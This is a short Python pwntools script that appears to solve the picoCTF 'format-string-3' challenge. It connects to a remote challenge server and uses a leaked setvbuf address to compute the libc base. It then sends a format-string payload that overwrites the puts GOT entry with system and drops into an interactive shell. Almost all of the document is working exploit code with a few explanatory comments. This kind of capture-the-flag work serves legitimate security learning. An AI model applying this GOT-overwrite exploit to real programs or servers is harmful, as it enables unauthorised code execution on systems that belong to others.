from pwn import *

context.arch = 'amd64'

# p = process('./format-string-3')
p = remote('rhea.picoctf.net', 54301)
libc = ELF('libc.so.6');

# libc.sym['<Insert-Command-Here>'] brings up the static offset of the commands we want
# if you set libc.address to the address of libc in the running program accesssing
# libc.sym for any command gives you the runtime address for each command automatically instead of the offset

p.recvuntil(b': ')
setvbuf_addr = int(p.recvline().strip(), 16)
setvbuf_offset = libc.sym['setvbuf']
libc.address = setvbuf_addr - setvbuf_offset

print("Setvbuf Address: " + hex(setvbuf_addr) + "\n")
print("Libc Base Address: " + hex(libc.address) + "\n")
system_addr = libc.sym['system']
print("System Address: " + hex(system_addr) + "\n")

elf = ELF('./format-string-3')
puts_got = elf.got['puts']
print(hex(puts_got))

payload = fmtstr_payload(38, {puts_got: system_addr}, write_size='short')
p.sendline(payload)
p.interactive()
